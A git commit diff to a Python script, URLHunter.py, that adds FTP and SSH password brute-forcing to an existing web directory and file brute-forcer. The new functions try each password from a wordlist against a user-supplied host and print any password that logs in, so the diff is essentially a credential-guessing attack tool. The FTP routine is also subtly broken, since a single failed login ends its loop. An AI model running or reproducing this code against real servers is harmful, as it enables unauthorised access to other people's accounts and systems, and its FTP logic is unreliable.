6bd8e31920c7bbf7d6e493868263f343b400d3ed
Karan Bhateja <40824205+Karanbhateja@users.noreply.github.com>
2023-10-30 11:16:29 +0530

    Version 1.1 (Testing Phase)
    Version 1.1 is not read yet still in development phase, so expect some errors. 
    
    Features added - FTP & SSH Brute Force

--- URLHunter.py
+++ URLHunter.py
@@ -31,10 +31,49 @@ def format_url(url):
         url += "/"
     return url
 
+# FTP Brute-Forcing Function
+def ftp_bruteforce(host, username, password_file):
+    try:
+        with open(password_file, "r") as file:
+            passwords = [line.strip() for line in file.readlines()]
+
+        for password in passwords:
+            ftp = ftplib.FTP(host)
+            response = ftp.login(username, password)
+            if "230" in response:
+                print(f"\nFTP Brute-Forcing Succeeded. Password: {password}")
+                return
+    except Exception as e:
+        pass
+
+    print("\nFTP Brute-Forcing Failed.")
+
+# SSH Brute-Forcing Function
+def ssh_bruteforce(host, username, password_file):
+    try:
+        with open(password_file, "r") as file:
+            passwords = [line.strip() for line in file.readlines()]
+
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        
+        for password in passwords:
+            try:
+                ssh.connect(host, username=username, password=password)
+                print(f"\nSSH Brute-Forcing Succeeded. Password: {password}")
+                ssh.close()
+                return
+            except Exception as e:
+                pass
+    except Exception as e:
+        pass
+
+    print("\nSSH Brute-Forcing Failed.")
+
 # Display the custom banner
 display_banner()
 
-# Target URL and wordlists for directories and filenames
+# Target URL and wordlists for directories, filenames, FTP, and SSH
 target_url = input("Enter the target URL (e.g., example.com): ")
 target_url = format_url(target_url)  # Ensure URL has "http://" or "https://" and a trailing slash
 
@@ -42,7 +81,9 @@ target_url = format_url(target_url)  # Ensure URL has "http://" or "https://" an
 print("\nSelect an option:")
 print("1. Directory Brute-Forcing")
 print("2. File Brute-Forcing")
-choice = input("Enter your choice (1 or 2): ")
+print("3. FTP Brute-Forcing")
+print("4. SSH Brute-Forcing")
+choice = input("Enter your choice (1, 2, 3, or 4): ")
 
 if choice == "1":
     directory_wordlist_file = input("\nEnter the name of the Directory Wordlist File (e.g., directory_wordlist.txt): ")
@@ -52,8 +93,22 @@ elif choice == "2":
     file_wordlist_file = input("\nEnter the name of the File Wordlist File (e.g., file_wordlist.txt): ")
     wordlist_file = file_wordlist_file
     print("\nPerforming File Brute-Forcing...")
+elif choice == "3":
+    ftp_host = input("\nEnter FTP host: ")
+    ftp_username = input("Enter FTP username: ")
+    ftp_password_file = input("Enter the name of the FTP password wordlist file: ")
+    print("\nPerforming FTP Brute-Forcing...")
+    ftp_bruteforce(ftp_host, ftp_username, ftp_password_file)
+    exit()
+elif choice == "4":
+    ssh_host = input("\nEnter SSH host: ")
+    ssh_username = input("Enter SSH username: ")
+    ssh_password_file = input("Enter the name of the SSH password wordlist file: ")
+    print("\nPerforming SSH Brute-Forcing...")
+    ssh_bruteforce(ssh_host, ssh_username, ssh_password_file)
+    exit()
 else:
-    print("\nInvalid choice. Please enter 1 for directory brute-forcing or 2 for file brute-forcing.")
+    print("\nInvalid choice. Please enter 1 for directory brute-forcing, 2 for file brute-forcing, 3 for FTP brute-forcing, or 4 for SSH brute-forcing.")
     exit()
 
 # Read the selected wordlist
@@ -67,9 +122,9 @@ for item in wordlist:
     
     if response.status_code in [200, 301, 401, 403]:
         if choice == "1":
-            print(f"==> {url} (Status Code: {response.status_code})")
+            print(f"\n==> {url} (Status Code: {response.status_code})")
         elif choice == "2":
-            print(f"==> {url} (Status Code: {response.status_code})")
+            print(f"\n==> {url} (Status Code: {response.status_code})")
 
 # Close the file
 file.close()
